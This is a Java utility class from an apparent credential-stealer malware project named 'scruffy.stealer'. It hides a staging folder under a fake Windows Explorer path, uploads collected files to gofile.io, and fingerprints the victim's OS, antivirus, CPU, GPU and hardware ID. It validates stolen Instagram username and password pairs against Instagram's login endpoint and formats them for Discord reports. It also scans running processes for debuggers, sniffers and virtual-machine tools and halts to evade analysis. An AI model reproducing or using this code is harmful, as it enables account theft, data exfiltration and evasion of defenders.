package scruffy.stealer.utils;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.time.Period;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import org.jsoup.Jsoup;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import scruffy.stealer.impl.app.discord;

public abstract class utilities {

    public static ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
    public static int stealWallets;

    public static List<String> content = new ArrayList<>();

    public utilities() {
        try {
            initialize();
        } catch (Exception ignored) {}
    }

    public abstract void initialize() throws Exception;

    public static String getPath() {
        return System.getenv("localappdata") + "/Microsoft/Windows/Explorer/" + String.format("%s (%s)", System.getProperty("user.name"), System.getenv("computername"));
    }

    public File getFolder() {
        File folder = new File(getPath());
        
        if (!folder.exists())
            folder.mkdirs();

        return folder;
    }

    public static String uploadFile(String path) {
        String server = new JsonParser().parse(HttpRequest.get("https://api.gofile.io/getServer").body()).getAsJsonObject().getAsJsonObject("data").get("server").getAsString();
        
        return new JsonParser().parse(HttpRequest.post("https://" + server + ".gofile.io/uploadFile").part("file", new File(path).getName(), new File(path)).body()).getAsJsonObject().getAsJsonObject("data").get("downloadPage").getAsString();
    }

    public static String getWindowsVersion() throws Exception {
        return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("CMD /C SYSTEMINFO | FINDSTR /B /C:\"OS Name:\"").getInputStream())).lines().findFirst().map(line -> line.replaceAll("(Microsoft|OS Name:)", "").trim()).orElse("Unknown");
    }

    public static String getAntivirus() throws Exception {
        return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List").getInputStream())).lines().filter(line -> line.startsWith("displayName=")).map(line -> line.split("=")[1]).collect(Collectors.joining(", ")).trim();
    }

    public static String getCPU() throws Exception {
        return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_Processor Get Name /Format:List").getInputStream())).lines().filter(line -> line.startsWith("Name=")).map(line -> line.split("=")[1]).collect(Collectors.joining(", "));
    }

    public static String getGPU() throws Exception {
        return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_VideoController Get Name /Format:List").getInputStream())).lines().filter(line -> line.startsWith("Name=")).map(line -> line.split("=")[1]).collect(Collectors.joining(", ")).trim();
    }

    public static int getBoostMonth(String date) {
    	ZonedDateTime zonedDateTime = ZonedDateTime.parse(date);
    	ZonedDateTime now = ZonedDateTime.now(ZoneId.of("UTC"));

    	Period period = Period.between(zonedDateTime.toLocalDate(), now.toLocalDate());
    	return period.getYears() * 12 + period.getMonths();
    }

    public static String getInfo(String username, String password) {
        String description = Jsoup.parse(HttpRequest.get("https://www.instagram.com/" + username).body()).select("meta[property=og:description]").attr("content");
        String[] infoList = description.split("-")[0].trim().split(", ");
        String followers = infoList[0].toLowerCase();
        String following = infoList[1].toLowerCase();
        String posts = infoList[2].toLowerCase();
        return "**" + username + ":" + password + "\n`" + posts + ", " + followers + ", " + following + "`\n[Go Profile](https://www.instagram.com/" + username + ")**\n";
    }

    public static boolean getCheck(String username, String password) {
        String payload = String.format("username=%s&enc_password=%%23PWD_INSTAGRAM_BROWSER%%3A0%%3A0%%3A%s&queryParams=%%7B%%7D&optIntoOneTap=false", username, password);

        HttpRequest request = HttpRequest.post("https://www.instagram.com/accounts/login/ajax/").header("authority", "www.instagram.com").header("x-ig-www-claim", "hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h").header("x-instagram-ajax", "82a581bb9399").header("content-type", "application/x-www-form-urlencoded").header("accept", "*/*").header("user-agent", "").header("x-requested-with", "XMLHttpRequest").header("x-csrftoken", "rn3aR7phKDodUHWdDfCGlERA7Gmhes8X").header("x-ig-app-id", "936619743392459").header("origin", "https://www.instagram.com").header("sec-fetch-site", "same-origin").header("sec-fetch-mode", "cors").header("sec-fetch-dest", "empty").header("referer", "https://www.instagram.com/").header("accept-language", "en-GB,en-US;q=0.9,en;q=0.8").header("cookie", "").send(payload);

        JsonObject response = new JsonParser().parse(request.body()).getAsJsonObject();

        return response.get("authenticated").getAsBoolean();
    }

    public static String getHWID() {
        String hwid = "";
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("WMIC /Node:localhost /Namespace:\\\\root\\CIMV2 Path Win32_ComputerSystemProduct Get UUID /Format:List").getInputStream()));
            hwid = reader.lines().filter(line -> line.startsWith("UUID=")).map(line -> line.split("=")[1]).findFirst().orElse("").trim();
        } catch (Exception ignored) {}
        return hwid;
    }

    public static String getComputerName() {
        return System.getenv("COMPUTERNAME");
    }
    
    public String getJarName() {
        return new File(getClass().getProtectionDomain().getCodeSource().getLocation().getPath()).getName().replace("%20", " ");
    }

    public static void rd3party() throws Exception {
        Scanner scanner = new Scanner(Runtime.getRuntime().exec("tasklist.exe").getInputStream(), "utf-8").useDelimiter("\\A");
        
        Arrays.asList(scanner.next().split("\r\n")).forEach(line -> {
            List<String> blackList = Arrays.asList("httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "httpd", "HTTPDebuggerSvc", "HTTPDebuggerUI", "fiddler", "ollydbg", "ida64", "idag", "idag64", "idaw", "idaw64", "idaq", "idaq64", "idau", "idau64", "scylla", "scylla_x64", "scylla_x86", "protection_id", "x64dbg", "x32dbg", "windbg", "reshacker", "ImportREC", "IMMUNITYDEBUGGER", "MegaDumper", "HTTPDebuggerUI", "HTTPDebuggerSvc", "HTTP Debugger", "HTTP Debugger (32 bit)", "HTTP Debugger (64 bit)", "OLLYDBG", "ida", "disassembly", "scylla", "Debug", "[CPU", "Immunity", "WinDbg", "x32dbg", "x64dbg", "Import reconstructor", "MegaDumper", "MegaDumper 1.0 by CodeCracker / SnD");

            if (blackList.stream().anyMatch(proc -> line.toLowerCase().contains(proc))) {
                System.out.println(line);
                Runtime.getRuntime().halt(1337);
            }
        });
    }

    public String getBadges(int flags, boolean emogies) {
        String[] badgeNames = emogies ? new String[] {
                "<:staff:874750808728666152>", "<:partner:874750808678354964>", "<:hypesquad_events:874750808594477056>",
                "<:bughunter_1:874750808426692658>", "<:hypersquad_1:968704541501571133>", "<:hypersquad_2:968704541883261018>",
                "<:hypersquad_3:968704541874860082>", "<:early_supporter:874750808414113823>", "<:bughunter_2:874750808430874664>",
                "<:developer:874750808472825986>", "<:certified_moderator:988996447938674699>", "<:active_developer:1056606947425665074>"
        } : new String[] {
                "staff", "partner", "hypesquad events", "bughunter 1", "house bravery", "house brilliance",
                "house balance", "early supporter", "bughunter 2", "early developer", "certified moderator", "active developer"
        };

        int[] badgeFlags = new int[]{
                1, 2, 4, 8, 64, 128, 256, 512, 16384, 131072, 262144, 4194304
        };

        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < badgeFlags.length; i++) {
            if ((flags & badgeFlags[i]) == badgeFlags[i]) {
                sb.append(badgeNames[i]).append(emogies ? "" : ", ");
            }
        }

        String[] badgeArr = sb.toString().split(",\\s*");
        Arrays.sort(badgeArr);

        return emogies ? (sb.toString().isEmpty() ? "**none**" : sb.toString()) : (badgeArr.length > 0 ? String.join(", ", badgeArr) : "none");
    }

}